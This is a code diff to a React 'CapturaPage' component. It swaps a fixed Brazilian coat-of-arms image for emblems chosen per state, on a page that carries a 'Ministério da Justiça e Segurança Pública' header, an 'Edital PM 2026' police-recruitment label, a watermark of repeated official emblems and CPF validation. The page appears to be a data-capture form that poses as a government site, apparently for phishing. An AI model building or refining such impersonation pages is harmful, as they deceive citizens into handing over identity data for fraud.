@@ -15,8 +15,8 @@ import { ExercitoFooter } from "@/components/ExercitoFooter";
 import { useLocation } from "wouter";
 import { useClarityEvents } from "@/hooks/use-clarity-events";
 import { useEstadoPM } from '@/hooks/useEstadoPM';
+import { getBrasaoUrl } from '@/utils/estadoPM';
 
-const BRASAO_URL = "https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png";
 
 // Schema de validação
 const capturaSchema = z.object({
@@ -99,6 +99,7 @@ export default function CapturaPage() {
   const sigla      = estadoPM?.sigla ?? 'PM';
   const editalSlug = estadoPM ? `Edital ${sigla} 2026` : 'Edital PM 2026';
   const nomeCorpo  = estadoPM?.nomeCompleto ?? 'Polícia Militar';
+  const brasaoUrl  = getBrasaoUrl(estadoPM);
 
   const [isValidatingCpf, setIsValidatingCpf] = useState(false);
   const [cpfValidated, setCpfValidated] = useState(false);
@@ -859,7 +860,7 @@ export default function CapturaPage() {
         {/* Header institucional */}
         <div style={{ padding: '20px 24px 16px', borderBottom: '1px solid #e5e7eb' }}>
           <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
-            <img src={BRASAO_URL} alt="Brasão" style={{ height: 36, objectFit: 'contain', flexShrink: 0 }} />
+            <img src={brasaoUrl} alt="Brasão" style={{ height: 36, objectFit: 'contain', flexShrink: 0 }} />
             <div>
               <div style={{ fontSize: 13, fontWeight: 700, color: '#1351b4', textTransform: 'uppercase', letterSpacing: '0.06em' }}>
                 Ministério da Justiça e Segurança Pública
@@ -987,7 +988,7 @@ export default function CapturaPage() {
           transform: 'rotate(-20deg) scale(1.6)',
         }}>
           {Array.from({ length: 72 }).map((_, i) => (
-            <img key={i} src={BRASAO_URL} alt="" style={{ width: '100px', height: 'auto', objectFit: 'contain' }} />
+            <img key={i} src={brasaoUrl} alt="" style={{ width: '100px', height: 'auto', objectFit: 'contain' }} />
           ))}
         </div>
       </div>
@@ -1002,8 +1003,8 @@ export default function CapturaPage() {
           <CardHeader className="text-center px-4 sm:px-6 py-6">
             <div className="flex justify-center mb-4">
               <img
-                src={BRASAO_URL}
-                alt="Brasão da República"
+                src={brasaoUrl}
+                alt="Brasão"
                 style={{ height: 56, objectFit: 'contain' }}
               />
             </div>
